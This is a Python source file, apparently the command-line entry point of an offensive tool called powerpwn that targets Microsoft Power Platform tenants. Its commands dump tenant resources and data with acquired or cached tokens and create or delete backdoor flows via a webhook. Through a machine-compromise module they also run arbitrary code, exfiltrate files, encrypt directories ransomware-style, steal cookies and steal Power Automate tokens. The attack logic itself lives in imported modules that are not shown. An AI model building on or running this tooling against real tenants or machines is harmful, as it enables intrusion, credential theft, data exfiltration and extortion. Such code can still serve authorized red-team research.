
import json
import logging
import os
import shutil

from art import tprint

from powerpwn.cli.arguments import parse_arguments
from powerpwn.cli.const import LOGGER_NAME
from powerpwn.machinepwn.enums.code_exec_type_enum import CodeExecTypeEnum
from powerpwn.machinepwn.enums.command_to_run_enum import CommandToRunEnum
from powerpwn.machinepwn.machine_pwn import MachinePwn
from powerpwn.powerdoor.backdoor_flow import BackdoorFlow
from powerpwn.powerdoor.enums.action_type import ActionType
from powerpwn.powerdoor.flow_factory_installer import FlowFlowInstaller
from powerpwn.powerdump.collect.data_collectors.data_collector import DataCollector
from powerpwn.powerdump.collect.resources_collectors.resources_collector import ResourcesCollector
from powerpwn.powerdump.gui.gui import Gui
from powerpwn.powerdump.utils.auth import acquire_token, acquire_token_from_cached_refresh_token
from powerpwn.powerdump.utils.const import API_HUB_SCOPE, POWER_APPS_SCOPE

logger = logging.getLogger(LOGGER_NAME)


def __init_command_token(args, scope: str) -> str:
    # if cached refresh token is found, use it
    if token := acquire_token_from_cached_refresh_token(scope, args.tenant):
        return token

    return acquire_token(scope=scope, tenant=args.tenant)


def run_collect_resources_command(args):
    # cache
    if args.clear_cache:
        try:
            shutil.rmtree(args.cache_path)
        except FileNotFoundError:
            pass
    os.makedirs(args.cache_path, exist_ok=True)

    token = __init_command_token(args, POWER_APPS_SCOPE)

    entities_fetcher = ResourcesCollector(token=token, cache_path=args.cache_path)
    entities_fetcher.collect_and_cache()


def run_gui_command(args):
    Gui().run(cache_path=args.cache_path)


def run_collect_data_command(args):
    token = __init_command_token(args, API_HUB_SCOPE)
    DataCollector(token=token, cache_path=args.cache_path).collect()


def run_backdoor_flow_command(args):
    action_type = ActionType(args.command)
    backdoor_flow = BackdoorFlow(args.webhook_url)
    if action_type == ActionType.delete_flow:
        backdoor_flow.delete_flow(args.environment_id, args.flow_id)

    elif action_type == ActionType.create_flow:
        backdoor_flow.create_flow_from_input_file(args.environment_id, args.input)

    elif action_type == ActionType.get_connections:
        output_to_file = args.output and args.output != ""
        connections = backdoor_flow.get_connections(args.environment_id, not output_to_file)
        if output_to_file:
            f = open(args.output, "w+")
            f.write(json.dumps(connections, indent=4))
        else:
            logger.info(connections)


def run_machine_pwn_command(args):
    command_type = CommandToRunEnum(args.command)
    machine_pwn = MachinePwn(args.webhook_url)
    if command_type == CommandToRunEnum.CLEANUP:
        res = machine_pwn.cleanup()
    elif command_type == CommandToRunEnum.CODE_EXEC:
        res = machine_pwn.exec_command(args.command_to_execute, CodeExecTypeEnum(args.type))
    elif command_type == CommandToRunEnum.EXFILTRATION:
        res = machine_pwn.exfiltrate(args.file)
    elif command_type == CommandToRunEnum.RANSOMWARE:
        res = machine_pwn.ransomware(args.crawl_depth, args.dirs.split(","), args.encryption_key)
    elif command_type == CommandToRunEnum.STEAL_COOKIE:
        res = machine_pwn.steal_cookie(args.cookie)
    elif command_type == CommandToRunEnum.STEAL_POWER_AUTOMATE_TOKEN:
        res = machine_pwn.steal_power_automate_token()
    print(res)


def main():
    print("\n\n------------------------------------------------------------")
    tprint("powerpwn")
    print("------------------------------------------------------------\n\n")

    args = parse_arguments()

    logging.basicConfig(level=args.log_level, format="%(asctime)s | %(name)s | %(levelname)s | %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
    logger.level = args.log_level
    command = args.command

    if command == "dump":
        run_collect_resources_command(args)
        run_collect_data_command(args)
        logger.info(f"Dump is completed in {args.cache_path}")
        if args.gui:
            logger.info("Going to run local server for gui")
            run_gui_command(args)

    elif command == "gui":
        run_gui_command(args)

    elif command in [action_type.value for action_type in ActionType]:
        run_backdoor_flow_command(args)

    elif command == "install-flow-factory":
        token = __init_command_token(args, POWER_APPS_SCOPE)
        FlowFlowInstaller(token).install(args.environment_id, args.connection_id)

    elif command in [cmd_type.value for cmd_type in CommandToRunEnum]:
        run_machine_pwn_command(args)

    else:
        logger.info("Run `powerpwn --help` for available commands.")


if __name__ == "__main__":
    main()
